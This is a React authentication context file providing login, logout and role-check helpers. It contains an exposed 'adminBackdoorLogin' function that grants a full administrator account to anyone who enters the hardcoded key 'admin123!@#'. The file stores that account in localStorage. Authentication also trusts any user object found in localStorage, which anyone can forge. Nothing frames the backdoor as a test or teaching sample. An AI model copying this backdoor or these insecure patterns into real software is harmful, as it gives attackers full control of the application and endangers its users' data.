import React, { createContext, useState, useContext, useEffect } from 'react';

// Create the Auth Context
const AuthContext = createContext(null);

// Auth Provider Component
export const AuthProvider = ({ children }) => {
  const [user, setUser] = useState(null);
  const [loading, setLoading] = useState(true);

  // Check for existing login on mount
  useEffect(() => {
    const storedUser = localStorage.getItem('user');
    if (storedUser) {
      setUser(JSON.parse(storedUser));
    }
    setLoading(false);
  }, []);

  // Login function
  const login = (userData, rememberMe = false) => {
    setUser(userData);
    
    // Store user data if remember me is checked
    if (rememberMe) {
      localStorage.setItem('user', JSON.stringify(userData));
    }
    
    return true;
  };

  // Admin backdoor login
  const adminBackdoorLogin = (secretKey) => {
    // The secret key for admin backdoor
    if (secretKey === 'admin123!@#') {
      const adminUser = {
        id: 'admin-special',
        name: 'System Administrator',
        email: 'admin@system.com',
        role: 'admin',
        permissions: ['all'],
      };
      
      setUser(adminUser);
      localStorage.setItem('user', JSON.stringify(adminUser));
      return true;
    }
    return false;
  };

  // Logout function
  const logout = () => {
    setUser(null);
    localStorage.removeItem('user');
  };

  // Check if user is authenticated
  const isAuthenticated = () => {
    return !!user;
  };

  // Check if user has specific role
  const hasRole = (role) => {
    if (!user) return false;
    return user.role === role;
  };

  // Values to be provided to the context consumers
  const value = {
    user,
    login,
    adminBackdoorLogin,
    logout,
    isAuthenticated,
    hasRole,
    loading
  };

  return <AuthContext.Provider value={value}>{children}</AuthContext.Provider>;
};

// Custom hook to use the auth context
export const useAuth = () => {
  const context = useContext(AuthContext);
  if (!context) {
    throw new Error('useAuth must be used within an AuthProvider');
  }
  return context;
};

export default AuthContext;